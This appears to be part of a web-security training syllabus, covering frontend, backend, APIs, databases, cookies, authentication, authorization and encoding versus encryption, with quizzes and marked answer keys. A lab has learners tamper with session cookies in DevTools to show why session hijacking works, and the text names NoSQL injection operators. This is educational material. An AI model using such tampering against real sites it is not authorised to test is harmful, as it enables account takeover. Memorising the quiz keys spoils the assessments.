#### 56. Frontend (HTML, CSS, JavaScript, React, Angular) `[theory]` — Week 5

The frontend is the part of a web application users see and interact with — the visual elements and user experience, or as the source puts it, the face of a website: the part you can touch, click, and experience. Its own analogy for this is a shop storefront, where users are customers who see the products (content), interact with the cashier (buttons/forms), and navigate the aisles (menus/pages). HTML structures content using tags like <p>, <div>, and <img>; CSS controls presentation (layout, colors, fonts, responsiveness across devices); JavaScript adds interactivity, enabling dynamic content updates, animations, and user-driven actions like form submissions — and the source maps these three layers onto a body: HTML is the skeleton giving structure (where the arms, legs, and head go), CSS is the skin, hair, and clothes that make the body look presentable, and JavaScript is the muscles and nervous system that let it move and react. The DOM (Document Object Model) is the programming interface that lets JavaScript manipulate HTML elements dynamically based on user actions — and it's this same manipulation mechanism that DOM-based XSS abuses. Frameworks like React and Angular provide pre-built components to speed up development of scalable, maintainable frontends. Because everything here executes inside the user's own browser, client-side security must specifically guard against XSS and enforce secure input validation, session handling, and HTTPS encryption — but none of it can be the only line of defence, since any validation or 'hidden' logic written in JS can be read and bypassed via DevTools.

**Key Points:**

- HTML structures content (tags like <p>, <div>, <img>), CSS controls presentation (layout/colors/fonts/responsiveness), JavaScript adds interactivity (dynamic updates, animations, form submissions) — three separate, independently inspectable/editable layers
- The DOM is the programming interface that lets JavaScript manipulate HTML elements dynamically based on user actions — this is the exact mechanism DOM-based XSS exploits to inject and execute attacker-controlled content
- React and Angular provide pre-built components and tooling for building scalable, maintainable, component-based UIs (Single Page Applications)
- Client-side security responsibilities named in the source: preventing XSS, secure input validation, session handling, and data encryption via HTTPS
- Any validation or 'hidden' logic written in JavaScript can be read and bypassed by an attacker using DevTools — client-side checks are a UX feature, not a security control
- Storefront analogy: the frontend is the shop's storefront — users are customers who see the products (content), interact with the cashier (buttons/forms), and navigate the aisles (menus/pages)
- Body analogy for the three layers: HTML is the skeleton (structure — where arms/legs/head go), CSS is the skin/hair/clothes (presentation), JavaScript is the muscles and nervous system (movement/interactivity)

**Resources:**

- [MDN Web Docs](https://developer.mozilla.org) _(link)_
- [React documentation](https://react.dev) _(link)_
- [freeCodeCamp](https://www.freecodecamp.org) _(platform)_

**Quick Quiz:**

1. Why is client-side (JavaScript) validation not a real security control?
   - JavaScript cannot validate input at all
   - **Any validation/logic in JS can be read and bypassed via browser DevTools** ✓
   - Browsers do not support JavaScript
   - Client-side validation is faster than server-side
   > Because the frontend runs entirely in the user's browser, any JS-based check is visible and can be bypassed by an attacker using DevTools.
2. What is the primary role of CSS in a web application?
   - Structuring content
   - **Styling/presentation of content** ✓
   - Server-side business logic
   - Database queries
   > CSS styles content; HTML structures it and JavaScript adds interactivity.
3. React and Angular are best described as:
   - Server-side databases
   - **Frameworks for building component-based, often single-page, user interfaces** ✓
   - Network protocols
   - Encryption algorithms
   > React/Angular/Vue are frontend frameworks used to build complex, component-based UIs (SPAs).

#### 57. Backend (Node.js, Python/Django/Flask, Java, PHP) `[theory]` — Week 5

The backend is the server side of a web application — it manages data, business logic, and server configuration, and communicates with the frontend, handling database operations, user authentication, and server-side logic while ensuring requests from users are processed correctly and data is returned. The source's own analogy: the backend is like a car engine — you don't see it, but it powers everything. It breaks the backend into three components using a kitchen analogy: the web server is the waiter (takes requests, serves responses), application logic is the chef (executes business rules, prepares data), and data management is the pantry (stores and manages the data/'ingredients'). The request-response cycle is walked through with a concrete example: a user clicks 'Order Pizza' -> the backend checks the order and retrieves pizza details from the database -> it sends back a confirmation showing the order details. Popular backend languages named: Python (simplicity/readability, beginner-friendly), Java (enterprise applications, performance), JavaScript/Node.js (server-side scripting, fast applications), Ruby (elegant syntax, web applications), and PHP (web development, integrates well with databases) — different chefs, same underlying responsibilities.

**Key Points:**

- Backend = server-side layer handling data management, application/business logic, and server configuration — the 'engine' analogy: never seen by the user, but powers everything
- Three named components via the kitchen analogy: web server = waiter (takes requests, serves responses), application logic = chef (executes business rules, prepares data), data management = pantry (stores/manages the data)
- Concrete request-response cycle example: user clicks 'Order Pizza' -> backend checks the order and retrieves details from the database -> backend sends back a confirmation with order details to the frontend
- Popular backend languages/stacks named: Python (simple/readable), Java (enterprise, performance), JavaScript/Node.js (server-side scripting, fast), Ruby (elegant syntax), PHP (web dev, integrates well with databases)
- Because the backend is where database operations and user authentication actually happen, this is where real security enforcement must live — frontend-only validation or logic doesn't count
- Backend frameworks often include built-in protections (CSRF tokens, ORM query parameterisation) that must not be disabled

**Resources:**

- [Node.js documentation](https://nodejs.org/en/docs) _(link)_
- [Django documentation](https://docs.djangoproject.com) _(link)_
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org) _(link)_

**Quick Quiz:**

1. Why must backend authentication and authorization checks never be skipped even if the frontend already validates input?
   - Because the frontend cannot render HTML
   - **Because the backend is where real security enforcement happens since client-side checks can be bypassed** ✓
   - Because backends do not support databases
   - Because frontend and backend always run on the same server
   > The backend handles business logic, authentication, and database access server-side, which is where real security enforcement must occur.
2. What is a key backend protection that should not be disabled?
   - **ORM query parameterisation, which reduces injection risk** ✓
   - Removing all authentication
   - Using GET requests to change server state
   - Disabling HTTPS
   > Backend frameworks often include built-in protections like CSRF tokens and ORM parameterised queries that must remain enabled.
3. Which of the following is a backend language/framework mentioned as commonly handling business logic?
   - HTML
   - **Django/Flask (Python)** ✓
   - CSS
   - DOM
   > Python's Django/Flask, along with Node.js, Java, and PHP, are backend technologies handling server-side logic.

#### 58. APIs - REST vs SOAP, HTTP Methods (GET/POST/PUT/DELETE), Status Codes `[theory]` — Week 5

An API (Application Programming Interface) is a set of rules and protocols that lets different software applications communicate. The source's own analogy: the API is a restaurant menu — it lists what you can order, and the backend/kitchen prepares your request accordingly; you send a request to the server and it sends back a response, the way a waiter carries your order to the kitchen and brings the result back. Two main API types are covered: REST and SOAP. REST (Representational State Transfer) is an architectural style using standard HTTP requests to perform CRUD (Create, Read, Update, Delete) operations — compared to a vending machine: you make a request (choose a snack) and get exactly what you asked for, fast and simple. SOAP (Simple Object Access Protocol) is a protocol for exchanging structured information via XML, more rigid than REST — compared to a formal restaurant with strict rules where you must follow a precise process to place your order. REST's tradeoff is speed and simplicity using standard web protocols; SOAP's tradeoff is more structure and formality at the cost of being more complex and slower — which is why REST dominates modern APIs and SOAP mostly survives in legacy enterprise integrations. REST's own stated features: it's stateless (each request is independent, the server doesn't remember past requests, which keeps REST simpler and scalable), lightweight (data usually sent in JSON or XML), built on standard HTTP methods (GET/POST/PUT/DELETE), scalable and flexible for large volumes of data and requests, and uses human-readable URLs like /users/123. A concrete REST example from the source: a POST to https://api.example.com/users with body {"UserId": 123} returns HTTP/1.1 200 OK with Content-Type: application/json and a body containing UserId, FirstName, LastName, and Email. SOAP, by contrast, is protocol-based with a strict set of rules, sends all data in XML (heavier but standardized), can run over multiple protocols (HTTP, SMTP, and more), has built-in security through WS-Security, standardized error handling, and can maintain state across a multi-step transaction — its own concrete example wraps a GetUser request and response inside a <soapenv:Envelope> body.

**Key Points:**

- API = restaurant menu analogy: the API lists what you can request, the backend is the kitchen that prepares it behind the interface
- Request/response flow: client sends a request to the server, server processes it and sends back a response — the waiter-to-kitchen-and-back analogy
- REST = architectural style using standard HTTP requests to perform CRUD (Create, Read, Update, Delete) — vending-machine analogy: put in a request, get exactly what you asked for, fast and simple
- SOAP = protocol for exchanging structured information using XML, more rigid than REST — formal-restaurant analogy: strict process, exact preparation required, more complex and slower as a direct tradeoff for that rigidity
- REST has largely replaced SOAP for public/web/mobile APIs because it favours speed and simplicity over SOAP's strict formality; SOAP mostly persists in legacy enterprise integrations
- GET (read), POST (create), PUT (replace), PATCH (partial update), DELETE (remove)
- 2xx = success, 3xx = redirect, 4xx = client error (401 unauthenticated, 403 forbidden, 404 not found), 5xx = server error
- REST APIs are the most common target for the API-security topics covered in M10
- REST's own named features: stateless (each request independent, server doesn't remember past requests), lightweight (JSON or XML), standard HTTP methods (GET/POST/PUT/DELETE), scalable/flexible for large data volumes, human-readable URLs (e.g. /users/123), supports multiple data formats though JSON is most common
- Concrete REST example from the source: POST https://api.example.com/users with body {"UserId": 123} returns HTTP/1.1 200 OK, Content-Type: application/json, body {UserId, FirstName, LastName, Email}
- SOAP's own named features: protocol-based (strict rules for sending/receiving messages), XML format (heavier, standardized), works over multiple protocols (HTTP, SMTP, and more), built-in security via WS-Security for sensitive data exchanges, standardized error handling, and stateful operations suited to complex multi-step transactions
- Concrete SOAP example from the source: a GetUser request/response wrapped in a <soapenv:Envelope> with <soapenv:Header/> and <soapenv:Body>, with the response's Content-Type as text/xml; charset=utf-8

```bash
curl -X GET https://api.example.com/users/1
curl -I https://example.com
```

**Resources:**

- [MDN HTTP documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP) _(link)_
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/) _(link)_
- [RESTful API Tutorial](https://restfulapi.net) _(link)_

**Quick Quiz:**

1. Which HTTP method is used to partially update a resource?
   - GET
   - PUT
   - **PATCH** ✓
   - DELETE
   > PATCH performs a partial update, while PUT replaces the whole resource.
2. An HTTP response with status code 403 means:
   - The resource was not found
   - The request succeeded
   - **The client is authenticated but forbidden from accessing the resource** ✓
   - The server encountered an internal error
   > 403 Forbidden indicates the client is understood but not permitted to access the resource, distinct from 401 (unauthenticated).
3. Compared to SOAP, REST APIs are generally:
   - XML-based and stateful
   - **Lightweight, commonly using JSON, and stateless** ✓
   - Only usable over UDP
   - Unable to return error codes
   > REST is a lightweight, typically JSON-based, stateless standard that has largely replaced the more rigid XML-based SOAP.

#### 59. Databases - SQL vs NoSQL (MySQL, PostgreSQL, MongoDB) `[theory]` — Week 5

A Database Management System (DBMS) is software that stores, organizes, and manages data in a database, acting as the interface between a database and a user so they can create, read, update, and delete data — the source's analogy: the DBMS is a librarian who helps you find and organize files in a filing cabinet, rather than you digging through the cabinet yourself. A database itself is an organized collection of structured data, like a giant digital filing cabinet. Two types are covered: relational databases (MySQL, PostgreSQL, Oracle DB, SQL Server) store data in tables of rows and columns and are queried with SQL, e.g. SELECT * FROM users WHERE id = 1 — using named operations such as SELECT, INSERT, UPDATE, and DELETE — and are pitched as best suited for structured data and complex queries requiring strict consistency and relationships; non-relational (NoSQL) databases (MongoDB, Cassandra, Couchbase) store data more flexibly as documents, key-value pairs, or graphs — typically for big/unstructured data such as social media posts, e.g. storing JSON documents directly in MongoDB — and are pitched as ideal for unstructured or semi-structured data, offering flexibility, scalability, and high performance in distributed systems. The four CRUD operations are each broken down individually: Create (adding new data, e.g. a new customer), Read (retrieving data, e.g. customers who bought a product last month), Update (changing existing data, e.g. updating a customer's address), and Delete (removing data, e.g. an old customer record). The source's own illustration of why databases matter: an online store uses a database to keep track of products, customer orders, and payments — without one, an application would struggle to handle that volume of information at all.

**Key Points:**

- DBMS = the software layer between a database and a user that lets the user Create/Read/Update/Delete data — the librarian analogy: it finds and organizes files in the cabinet on your behalf
- Relational databases (MySQL, PostgreSQL, Oracle DB, SQL Server): data organized in tables of rows and columns, queried with SQL
- Non-relational/NoSQL databases (MongoDB, Cassandra, Couchbase): data stored flexibly as documents/key-value pairs/graphs, typically for big or unstructured data (e.g. social media posts)
- Example SQL query from the source: SELECT * FROM users WHERE id = 1 — contrasted with the NoSQL approach of storing JSON documents directly in MongoDB
- CRUD broken down individually: Create = adding new data (new customer record), Read = retrieving/querying data (customers who bought X last month), Update = modifying existing data (changing a customer's address), Delete = removing data (dropping an old customer record)
- SQL injection (M9) targets SQL databases via unsanitised query input; NoSQL injection targets MongoDB-style query operators (e.g. $ne, $gt) instead of SQL syntax
- ORMs (Object-Relational Mappers) reduce (but don't eliminate) injection risk via parameterised queries
- Knowing which CRUD operation and which query language (SQL vs NoSQL operators) an app uses is the first step in scoping an injection test
- Relational databases are pitched as best suited for structured data and complex queries requiring strict consistency and relationships; non-relational databases are pitched as ideal for unstructured/semi-structured data, offering flexibility, scalability, and high performance in distributed systems
- Named SQL operations from the source: SELECT, INSERT, UPDATE, DELETE
- Concrete example of why databases matter: an online store uses a database to track products, customer orders, and payments — without databases, applications would struggle to handle that volume of information

**Resources:**

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) _(link)_
- [MongoDB Documentation](https://www.mongodb.com/docs/) _(link)_
- [PostgreSQL Documentation](https://www.postgresql.org/docs/) _(link)_

**Quick Quiz:**

1. SQL injection primarily targets which type of database?
   - NoSQL document stores
   - **Structured relational databases like MySQL/PostgreSQL via unsanitised query input** ✓
   - In-memory caches
   - Flat text files only
   > SQL injection exploits unsanitised input in queries sent to SQL databases such as MySQL/PostgreSQL.
2. NoSQL injection against MongoDB typically abuses:
   - SQL WHERE clauses
   - **MongoDB-style query operators such as $ne or $gt** ✓
   - HTML tags
   - TCP handshakes
   > NoSQL injection targets MongoDB-style operators like $ne/$gt rather than SQL syntax.
3. How do ORMs (Object-Relational Mappers) affect injection risk?
   - They eliminate all injection risk permanently
   - **They reduce (but don't eliminate) injection risk via parameterised queries** ✓
   - They increase injection risk by concatenating strings
   - They have no effect on database security
   > ORMs typically use parameterised queries, reducing but not fully eliminating injection risk if misused.

#### 60. Sessions & Cookies (HttpOnly, Secure, SameSite attributes) `[theory]` — Week 5

Cookies are small pieces of data stored on the user's device by the browser while browsing a website, remembering things like login status, preferences, and browsing activity — the source's own framing: a cookie is like a note a website gives your browser, asking it to remember something for later. How they work: the server gives your browser a cookie on the first visit, and on every later visit the browser sends that cookie back so the server can 'remember' you — like a coffee-shop loyalty card that gets scanned every time you return, or a library slip that tells the librarian your seat number and which books you took. Four cookie types are named: session cookies (temporary, deleted when the browser closes, keep you logged in as you navigate), persistent cookies (stored until they expire or are manually deleted, remember settings across visits), first-party cookies (set directly by the site you're on, used for session management and analytics), and third-party cookies (set by other domains, used for advertising/tracking across multiple sites). Three uses are named: session management (staying logged in, saving cart items), personalization (saving theme/language preferences), and tracking/analytics (monitoring activity to improve UX or marketing). Because a session cookie is what keeps a stateless HTTP connection 'logged in,' it functions as a bearer credential — whoever holds that value is treated by the server as that user, which is exactly what missing HttpOnly/Secure/SameSite flags expose to theft and cross-site abuse.

**Key Points:**

- Cookie mechanics: the server hands the browser a cookie on first visit; the browser sends it back on every subsequent request so the server can 'remember' the user — the loyalty-card/library-slip analogy
- Four cookie types: session cookies (temporary 'pass,' gone when the browser closes), persistent cookies ('sticky note' that stays until expiry or manual deletion), first-party cookies (set by the site you're actually on), third-party cookies (set by other domains — cross-site trackers, mainly advertising)
- Three named uses: session management (staying logged in, remembering cart contents), personalization (remembering theme/language settings), tracking and analytics (monitoring activity for UX/marketing)
- A session cookie functions as a bearer credential for an otherwise-stateless protocol: anyone holding that cookie value is treated by the server as the logged-in user — the entire basis of session hijacking
- HttpOnly: blocks JavaScript from reading the cookie (mitigates theft via XSS)
- Secure: cookie only ever sent over HTTPS
- SameSite=Strict: blocks the cookie being sent on cross-site requests (mitigates CSRF)
- Third-party cookies are a distinct risk surface from first-party session cookies — they track a user across sites the user never directly authenticated to

```bash
Set-Cookie: sessionID=abc123xyz456; HttpOnly; Secure; SameSite=Strict;
```

**Resources:**

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) _(link)_
- [MDN Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie) _(link)_
- [PortSwigger - Session hijacking](https://portswigger.net/web-security/session-hijacking) _(platform)_

**Quick Quiz:**

1. Which cookie attribute prevents JavaScript from reading the cookie value, mitigating theft via XSS?
   - Secure
   - SameSite=Strict
   - **HttpOnly** ✓
   - Path=/
   > HttpOnly blocks client-side JavaScript from accessing the cookie, reducing the impact of an XSS vulnerability.
2. Which cookie attribute ensures the cookie is only ever sent over an encrypted connection?
   - HttpOnly
   - **Secure** ✓
   - SameSite
   - Domain
   > The Secure flag ensures the cookie is only transmitted over HTTPS.
3. What attack does SameSite=Strict primarily mitigate?
   - SQL injection
   - **Cross-Site Request Forgery (CSRF)** ✓
   - Buffer overflow
   - DNS spoofing
   > SameSite=Strict blocks the cookie from being sent on cross-site requests, mitigating CSRF.

#### 61. Authentication Methods (Password, MFA, OAuth 2.0, Form-based) `[theory]` — Week 5

Authentication is the process of verifying the identity of a user, system, or entity before granting access — proving you are who you claim to be, per the source's analogy of showing your ID to a security guard before entering a party. Single-Factor Authentication (SFA) uses only one factor, typically a username/password combination. Multi-Factor Authentication (MFA) requires 2+ factors drawn from three categories: something you know (password/PIN), something you have (smartphone/hardware token), and something you are (fingerprint/facial recognition) — the source's example is entering a password, then confirming via a code sent to your phone. Biometric authentication uses unique physical or behavioral traits (fingerprint scanning, facial recognition, voice recognition). Passwordless authentication skips the password entirely, instead using biometric verification or magic links sent via email/SMS. OAuth (Open Authorization) is a protocol that lets third-party applications access user data without exposing the user's actual credentials — commonly used for logging in via Google, Facebook, or GitHub instead of creating a new password for every site.

**Key Points:**

- Authentication answers 'who are you?' — the source's analogy: showing your ID at the door of a party before being let in
- Single-Factor Authentication (SFA): one factor only, typically username + password — the weakest, most common baseline
- Multi-Factor Authentication (MFA): 2+ factors from three categories — something you know (password/PIN), something you have (phone/hardware token), something you are (fingerprint/face) — e.g. password plus a code sent to your phone
- Biometric authentication: fingerprint scanning, facial recognition, voice recognition — traits that 'can't be copied' the way a password can be guessed or stolen
- Passwordless authentication: no password entry at all — biometric verification or magic links via email/SMS instead
- OAuth lets a third-party app access user data without the user ever handing that app their actual credentials — named real-world examples: logging in via Google, Facebook, or GitHub
- Because OAuth substitutes tokens for shared credentials, misconfigurations in the token/redirect flow (not the password) become the new attack surface — misconfigured redirect URIs are a common vuln class
- Adaptive/risk-based authentication adds extra checks for unusual login context (new device/location)

**Resources:**

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html) _(link)_
- [OAuth 2.0](https://oauth.net/2/) _(link)_
- [Auth0 Docs](https://auth0.com/docs) _(link)_

**Quick Quiz:**

1. MFA (Multi-Factor Authentication) combines:
   - **Two or more of: something you know, something you have, something you are** ✓
   - Two passwords only
   - Two usernames
   - A password and a CAPTCHA only
   > MFA combines 2+ of the three factors: Knowledge, Possession, and Inherence.
2. A commonly cited vulnerability class in OAuth2 implementations involves:
   - Weak Wi-Fi encryption
   - **Misconfigured redirect URIs** ✓
   - Slow database queries
   - Missing CSS files
   > Misconfigured redirect URIs are a common OAuth2 vulnerability class that can lead to token theft/account takeover.
3. OAuth2 primarily improves security over traditional login by:
   - Requiring users to share their password with every third-party app
   - **Using access tokens instead of a shared username/password** ✓
   - Removing the need for authentication entirely
   - Storing passwords in plaintext
   > OAuth2 uses delegated access tokens rather than requiring the shared username/password to be handled directly by the requesting party.

#### 62. Authorization - RBAC & ABAC `[theory]` — Week 5

Authorization determines what resources or actions an authenticated user or system has permission to access or perform — it governs privileges after authentication has already happened. The source's analogy: once you're inside the party (authenticated), authorization is what tells you which rooms you're allowed into — some doors are 'VIP Access Only,' and only people with the right badge can enter. Authentication answers 'who are you?'; authorization answers 'what are you allowed to do?' Four access-control models are covered: RBAC (Role-Based Access Control) grants permissions tied to a predefined role, e.g. 'Admin' vs 'User' roles each with different permission sets; ABAC (Attribute-Based Access Control) makes finer-grained decisions based on attributes such as role, time of access, location, or device — e.g. a manager can access employee records only during work hours; DAC (Discretionary Access Control) lets the resource owner decide who gets access and even transfer that ownership, e.g. a file owner deciding who can read/write/execute their file; MAC (Mandatory Access Control) has the system enforce access per a pre-established security policy rather than owner discretion, used in high-security environments like government or military systems.

**Key Points:**

- Authorization answers 'what are you allowed to do?' — asked only after identity is already proven (the source's 'VIP Access Only' doors analogy)
- RBAC (Role-Based): permissions tied to a predefined role, e.g. 'Admin' vs 'User' roles in a company, each with different permission sets
- ABAC (Attribute-Based): finer-grained than RBAC, decisions based on attributes like role + time + location + device — e.g. a manager can access employee records only during work hours
- DAC (Discretionary Access Control): the resource owner decides who gets access and can transfer ownership — e.g. a file owner deciding read/write/execute permissions on their own file
- MAC (Mandatory Access Control): access is dictated by the system per a pre-established security policy rather than by the resource owner — used in high-security environments like government/military systems
- Workflow: authenticate -> identify roles/attributes -> compare against policy -> grant/deny -> log
- Broken Access Control (M9) is what happens when one of these models is implemented incorrectly — e.g. a missing RBAC check on one endpoint, or an ABAC rule trusting a client-supplied attribute
- Best practice: principle of least privilege + regular access audits

**Resources:**

- [OWASP Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html) _(link)_
- [PortSwigger - Access control](https://portswigger.net/web-security/access-control) _(platform)_
- [NIST RBAC](https://csrc.nist.gov/projects/role-based-access-control) _(link)_

**Quick Quiz:**

1. RBAC (Role-Based Access Control) grants permissions based on:
   - A user's dynamic attributes like age or location
   - **A user's assigned role, e.g. Manager** ✓
   - Random selection
   - The current time of day only
   > RBAC ties permissions to a user's role, such as 'Manager' being permitted to approve expense reports.
2. ABAC differs from RBAC in that it:
   - Only works with a single role per user
   - **Makes dynamic decisions based on attributes, e.g. age verification for a purchase** ✓
   - Cannot be logged or audited
   - Is only used in networking
   > ABAC (Attribute-Based) makes access decisions dynamically based on attributes, unlike RBAC's fixed role mapping.
3. Broken Access Control vulnerabilities (covered later in the OWASP module) exploit failures in which process?
   - Encryption
   - **Authorization -- determining what an authenticated user is allowed to do** ✓
   - DNS resolution
   - TCP handshake
   > Authorization governs what an authenticated user is permitted to do; failures here are Broken Access Control.

#### 63. Lab: Inspect & manipulate session cookies with DevTools `[lab]` — Week 5

Use browser DevTools to view, understand, and tamper with a site's session cookies — the manual-testing precursor to the session-hijacking/CSRF attacks covered later. This exercise makes the cookie module's mechanism concrete: the server hands your browser a cookie, and the browser sends it back on every request so the server 'remembers' you (the loyalty-card/library-slip mechanism) — DevTools lets you see and manipulate that exchange directly.

**Key Points:**

- Open DevTools (F12) -> Application/Storage tab -> Cookies to view every cookie the site's server has handed your browser — this is the loyalty-card/library-slip exchange made visible
- Identify which cookie is the session cookie (session management/login-state) versus which are first-party analytics/personalization cookies or third-party tracking cookies, per the four cookie types covered in this module
- Check for missing HttpOnly/Secure/SameSite flags on any session cookie
- Try editing a cookie value directly in DevTools and reloading to observe the app's response — this demonstrates that the cookie value alone is what separates 'logged in' from 'logged out,' i.e. why session hijacking works
- Note whether the cookie you're inspecting behaves as a session cookie (gone when the browser closes) or a persistent cookie (survives until expiry/deletion)

**Resources:**

- [Chrome DevTools documentation](https://developer.chrome.com/docs/devtools/) _(link)_
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) _(link)_
- [Firefox Developer Tools](https://developer.mozilla.org/en-US/docs/Tools) _(link)_

**Quick Quiz:**

1. In Chrome DevTools, where do you view a site's cookies and their flags?
   - Console tab
   - **Application tab, Storage, Cookies** ✓
   - Network tab, Headers only
   - Elements tab, Styles
   > Chrome's Application tab (Firefox's Storage tab) under Cookies shows each cookie and its HttpOnly/Secure/SameSite flags.
2. If a session cookie is missing the HttpOnly flag, what risk does this create?
   - The cookie can no longer be sent over HTTPS
   - **JavaScript (e.g. injected via XSS) can read and exfiltrate the cookie** ✓
   - The cookie becomes encrypted automatically
   - The server will reject all requests
   > Without HttpOnly, client-side JavaScript (including malicious injected scripts) can access the cookie via document.cookie.
3. What is the purpose of manually editing a session cookie's value in DevTools and reloading the page?
   - To improve page load speed
   - **To observe how the application responds to a tampered/invalid session token** ✓
   - To permanently disable cookies
   - To bypass HTTPS entirely
   > Tampering the cookie value tests whether the server properly validates session tokens rather than trusting the client blindly.


---

## M5: Cryptography Basics

**Month 2** · Week 5 · 10 topics

Cryptography is how confidentiality and integrity are actually enforced technically — and 'Cryptographic Failures' is its own OWASP Top 10 category (A02) because encoding, encryption, and hashing get confused for each other constantly. This module makes the distinction permanent.

**Learning Outcomes:**

- Clearly distinguish encoding, encryption, and hashing and when each is (mis)used
- Explain symmetric vs asymmetric cryptography and name common algorithms of each
- Identify weak hashing (MD5/SHA1) vs strong password hashing (bcrypt/Argon2)
- Describe how digital signatures and PKI/certificates establish trust
- Generate and use an RSA keypair with OpenSSL

**Module Resources:**

- [CryptoHack.org](https://cryptohack.org) _(platform)_
- [OWASP Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/) _(link)_
- [Khan Academy - Cryptography](https://www.khanacademy.org/computing/computer-science/cryptography) _(video)_

**Module Quiz (10 questions):**

1. Which statement correctly distinguishes encoding from encryption?
   - Encoding requires a secret key to reverse; encryption does not
   - **Encoding is reversible by anyone with no key; encryption requires a key to reverse** ✓
   - Both provide equivalent security guarantees
   - Encoding is one-way like hashing
   > Encoding has no security value and is reversible without a key, while encryption requires the correct key.
2. Why is it a 'cryptographic failure' (OWASP A02) to hash a password with unsalted SHA-256 instead of bcrypt?
   - SHA-256 is an asymmetric algorithm and can't process passwords
   - **SHA-256 is fast and lacks the deliberate slowness/salting that makes brute-forcing a cracked password database impractical** ✓
   - SHA-256 requires a private key that must be kept secret
   - bcrypt is not a hashing algorithm
   > General-purpose fast hashes like SHA-256 make offline brute-force/dictionary attacks on stolen password hashes far easier than deliberately slow, salted bcrypt/Argon2.
3. In the TLS chain of trust, if a site's Intermediate CA certificate were compromised, what would be the impact?
   - None, since only Root CAs matter
   - **An attacker could potentially issue fraudulent certificates trusted by anyone who trusts that Root CA** ✓
   - It would only affect Base64 encoding
   - It would break AES only
   > Since browsers trust the Root CA and everything it (or its Intermediates) signs, a compromised Intermediate CA can issue fraudulent trusted certificates.
4. Which pairing correctly matches an algorithm to its category?
   - AES is asymmetric
   - RSA is symmetric
   - **bcrypt is a password hashing algorithm** ✓
   - Diffie-Hellman is a hash function
   > bcrypt is a password-hashing algorithm; AES is symmetric, RSA is asymmetric, and Diffie-Hellman is a key-exchange protocol.
5. What is the core reason Diffie-Hellman/ECDH is needed even though symmetric encryption (AES) is faster than asymmetric encryption?
   - To avoid encryption entirely
   - **To let two parties agree on a shared symmetric key over an untrusted channel before using fast symmetric encryption** ✓
   - To replace hashing
   - To encode binary data as text
   > Key exchange protocols solve the 'key exchange problem' so both parties can then use fast symmetric encryption (like AES) with a securely shared key.
6. A digital signature verification fails after a file transfer. What does this most likely indicate?
   - The file was encoded in Base64 during transfer
   - **The file was altered/corrupted in transit, breaking the hash-signature match** ✓
   - The verifier used the wrong hash algorithm intentionally
   - Digital signatures always fail on the first attempt
   > Verification recomputes the file's hash and compares it against the signed hash; any alteration in transit causes a mismatch and failed verification.
7. Which of these is true regarding HTTPS/TLS's use of both symmetric and asymmetric cryptography?
   - TLS uses only asymmetric crypto throughout the session for speed
   - **TLS uses asymmetric crypto (RSA/ECDH) to establish a session key, then switches to fast symmetric crypto (AES) for the bulk data** ✓
   - TLS never uses hashing
   - TLS uses only Base64 encoding for security
   > TLS handshakes use asymmetric methods for key exchange/authentication, then symmetric AES for the actual encrypted data transfer -- combining strengths of both.
8. Why is Base64 sometimes mistaken by beginners for 'encryption'?
   - Because it uses a secret key
   - **Because the output looks unreadable at a glance even though it requires no key to reverse** ✓
   - Because it's slower than AES
   - Because it hashes the input
   > Base64 output looks obfuscated, leading beginners to assume it's secure, when in fact anyone can decode it with no key -- a classic OWASP A02 mistake.
9. What role does a Certificate Authority (CA) play in HTTPS?
   - It generates the website's private key for them
   - **It vouches for/signs the binding between a public key and a domain identity that clients already trust** ✓
   - It encrypts all HTTP traffic directly
   - It stores users' passwords
   > A CA signs X.509 certificates, vouching that a given public key belongs to the claimed domain, which browsers trust via the chain of trust.
10. When generating an RSA keypair and signing a file with OpenSSL, which key is used to create the signature and which to verify it?
   - Public key to sign, private key to verify
   - **Private key to sign, public key to verify** ✓
   - Both to sign, neither to verify
   - A symmetric key for both
   > The signer uses their private key to sign (encrypt the hash); anyone can verify using only the corresponding public key.

### Topics

#### 64. Encoding vs Encryption vs Hashing - Key Differences & When Used `[theory]` — Week 5

The single most confused trio in security, and the direct root of OWASP's 'Cryptographic Failures' category. Cryptography itself is the practice of securing information by transforming it into an unreadable format so only authorized parties can access or understand it, and the vocabulary that matters is precise: Plain Text (the original readable message), Encryption (converting plain text into a secret code), Decryption (converting it back), and Key (the secret piece of information used to do both). Encoding is reversible with no key at all — Base64('Hello') = SGVsbG8=; encryption is reversible only with the key; hashing is not reversible at all. Real vulnerability catalogs have CWE IDs for getting this wrong: CWE-259 (hardcoded passwords), CWE-327 (broken or risky encryption methods), and CWE-331 (insufficient randomness in security functions) — and what is actually at stake when it goes wrong is passwords, credit card numbers, personal information, health records, business secrets, and session tokens.

**Key Points:**

- Cryptography = the practice of securing information by transforming it into an unreadable format so only authorized parties can access or understand it
- Core vocabulary: Plain Text (original readable message), Encryption (converting plain text to secret code), Decryption (reversing that), Key (the secret used for both)
- Encoding: reformats data, no security value on its own, no key involved — Base64('Hello') = SGVsbG8=
- Encryption: scrambles data with a secret key, reversible only if you have that key
- Hashing: one-way, fixed-length output — changing one letter changes the whole hash, and there is no key to reverse it
- CWE-259 (hardcoded passwords), CWE-327 (broken/risky encryption methods), CWE-331 (insufficient randomness) are named weakness types behind OWASP A02 Cryptographic Failures — almost always caused by treating one of these three as if it were another
- The data actually at risk when this goes wrong: passwords, credit card numbers, personal information (names/addresses/SSNs), health records (HIPAA-protected), business secrets, and session tokens

**Resources:**

- [OWASP Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/) _(link)_
- [CyberChef](https://gchq.github.io/CyberChef/) _(tool)_
- [CryptoHack](https://cryptohack.org) _(platform)_

**Quick Quiz:**

1. Which of the three (encoding, encryption, hashing) is reversible without any secret key?
   - **Encoding** ✓
   - Encryption
   - Hashing
   - None of them are ever reversible
